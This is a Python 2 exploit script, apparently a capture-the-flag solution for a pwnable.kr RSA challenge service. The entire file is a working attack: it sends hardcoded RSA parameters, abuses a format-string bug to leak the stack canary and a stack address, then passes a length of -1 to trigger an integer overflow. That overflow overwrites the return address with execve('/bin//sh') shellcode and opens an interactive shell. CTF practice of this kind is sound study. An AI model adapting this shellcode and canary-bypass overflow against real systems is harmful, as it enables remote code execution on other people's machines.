import random
import struct
import sys
import socket
import time
import fcntl
import os

def read_until(word):
    data = ''
    letterIndex = 0
    letter = word[0]
    while word != data:
        character = s.recv(1)
        sys.stdout.write(character)
        if character == letter:
            data+=character
            letterIndex+=1
            if letterIndex < len(word):
                letter = word[letterIndex]
        else:
            data = ''
            letterIndex = 0
            letter = word[letterIndex]


if __name__ == '__main__':

    shellcode = "\x31\xf6\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('pwnable.kr', 9012))

    # First set RSA key
    # p,q,e,d = get_RSA_values() bug in pwnable binary using hardcoded working values
    p = 103
    q = 173
    e = 8537
    d = 10937
    read_until('>')
    s.send('1\n')
    read_until(':')
    s.send(str(p)+'\n')
    read_until(':')
    s.send(str(q)+'\n')
    read_until('e :')
    s.send(str(e)+'\n')
    read_until('d :')
    s.send(str(d)+'\n')
    read_until('>')


    # Now use format string vulenrability in decryption code to read canary value
    s.send('3\n')
    read_until(':')
    s.send('1024\n')
    read_until('data')
    s.send('c30800005a090000e90500009e1300000b4100001d0e0000d2220000c30800005a090000e9050000e03200000b4100001d0e0000\n') # determined previously (%205$p.$208$p)
    read_until('result -\n')
    output = s.recv(33).split('.')
    print output
    canary = int(output[0],16)
    stack_position = int(output[1],16)-1808 # 0x10+0x10+0x610 mains_frame+saved_frame+0x610
    print 'canary ->' + hex(canary)
    print 'stack pos ->' + hex(stack_position+1808)
    print 'stack pos ->' + hex(stack_position)
    read_until('>')


    # trigger unsigned int bug to overflow and overwrite return address
    payload = shellcode# remove null byte
    payload += 'A'*(0x610-len(shellcode) -8)
    payload += struct.pack('<Q', canary)
    payload += 'A'*8
    payload += struct.pack('<Q', stack_position)
    s.send('3\n')
    read_until(':')
    s.send('-1\n')
    read_until('data')
    s.send(payload +'\n')

    s.settimeout(0.2)
    while(True):
        try:
            sys.stdout.write(s.recv(512))
        except:
            s.send(raw_input() + '\n')




